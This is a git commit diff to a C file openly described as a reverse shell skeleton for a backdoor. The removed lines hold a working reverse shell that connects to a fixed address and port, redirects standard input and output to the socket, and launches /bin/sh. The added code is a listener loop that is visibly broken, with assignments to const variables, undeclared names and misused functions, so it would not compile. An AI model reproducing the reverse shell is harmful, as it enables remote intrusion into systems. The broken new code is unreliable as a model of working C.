d0230e93336b54442044f4bfef9c847e100e1672
unknow <rmdero_jr_@outlook.com>
2017-10-06 02:48:51 -0300

    Update shell.c

--- shell.c
+++ shell.c
@@ -1,50 +1,96 @@
 /* reverse shell.c  
 a skelleton of reverse shell contained in the backdoor. */
 
-
-/* coder mrx6s0 */
-
 #include <stdio.h>
-#include <unistd.h>
-#include <netinet/in.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <arpa/inet.h>
+#include <time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
-#include <X11/Xlib.h>
 
-#define REMOTE_ADDR "127.0.0.1"
-#define REMOTE_PORT 2121
+#define IP "127.0.0.1"
 
-int main(int argc, char *argv[])
+#define PORT 55766
 
-{
-    struct sockaddr_in sa;
+  typedef struct target {
 
-    int x;
+  char * ip;
 
-    do {
-        
-    XFreeCursor;
-    
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
-    sa.sin_port = htons(REMOTE_PORT);
+  int port;
 
-    x = socket(AF_INET, SOCK_STREAM, 0);
+  char cmd[1025]; /* commands receivd from the server */
 
-    connect(x, (struct sockaddr *)&sa, sizeof(sa));
-    //send(msocket("Conected...\n",31,0));
+  int listenfd;
 
-    dup2(x, 0);
-    dup2(x, 1);
-    dup2(x, 2);
+  socklen_t clilen;
 
-    execve("/bin/sh", 0, 0);
-    execve("cmd.exe", 0, 0);
-    execve("/netcat", 0, 0);
+  int n;
+  /* int persistency;  run a thread function to keep connection aliv */
 
-    }
+  } Target;
 
-    while (1);
+  int main() {
 
-    return 0;
+  Target target;
+
+  /* create connection */
+
+  struct sockaddr_in serv_addr;
+
+  const unsigned int sockfd;
+  const unsigned int newsockfd;
+  const char cmd;
+  const unsigned int listenfd;
+  /*const socklen_t clien; */
+  const unsigned int n;
+
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  if (sockfd < 0)
+      perror("error 101");
+  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
+    perror("setsockopt(SO_REUSEADDR) failed");
+
+  memset(&serv_addr, '0', sizeof(serv_addr));
+  memset(cmd, NULL , sizeof(cmd));
+
+  serv_addr.sin_family = AF_INET;
+  serv_addr.sin_addr.s_addr = htonl(IP);
+  serv_addr.sin_port = htons(PORT);
+
+  bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
+
+  listen(listenfd, 10);
+
+  printf("about to listen\n");
+     listen(sockfd,5);
+     clien = sizeof(serv_addr);
+     //printf("About to accept\n");
+
+     int i;
+
+     for(i=0; i<100; i++){
+         newsockfd = accept(sockfd,
+                 (struct sockaddr *) &serv_addr,
+                 &clien);
+
+         if (newsockfd < 0)
+             error("ERROR on accept");
+         bzero(cmd,256);
+         n = read(newsockfd,cmd,255);
+         if (n < 0) error("ERROR reading from socket");
+         printf("Here is the message: %s\n",cmd);
+         n = write(newsockfd,"I got your message",18);
+         if (n < 0) error("ERROR writing to socket");
+         close(newsockfd);
+     }
+     close(sockfd);
+     return 0;
 }
+/* sockfd = socket(AF_INET, SOCK_STREAM, 0);
+if (sockfd < 0)
+    error("ERROR opening socket");
+
+if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
+    error("setsockopt(SO_REUSEADDR) failed"); */
